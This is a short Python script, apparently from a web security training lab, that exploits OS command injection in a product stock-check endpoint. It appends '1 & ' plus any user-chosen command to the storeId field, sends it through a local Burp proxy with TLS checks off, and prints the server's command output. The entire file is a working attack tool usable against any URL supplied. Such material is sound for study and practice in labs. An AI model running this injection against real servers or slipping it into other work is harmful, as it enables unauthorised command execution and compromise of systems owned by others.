import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# all requests sent and recieved go through Burp Proxy

def os_injection(url, command):
    os_inject_payload = '1 & ' + command
    check_stock_path = "/product/stock"
    params = {'productId': '1', 'storeId': os_inject_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
    if (len(r.text) > 3):
        print("(+) command injection sucessful!")
        print("(+) output of command: " + r.text)
    else:
        print("(-) command injeciton failed")

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <os command>" % sys.argv[0])
        print("(+) Example: %s www.example.com whoami" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    command = sys.argv[2]
    print("(+) Testing command injection...")
    os_injection(url, command)

if __name__ == "__main__":
    main()
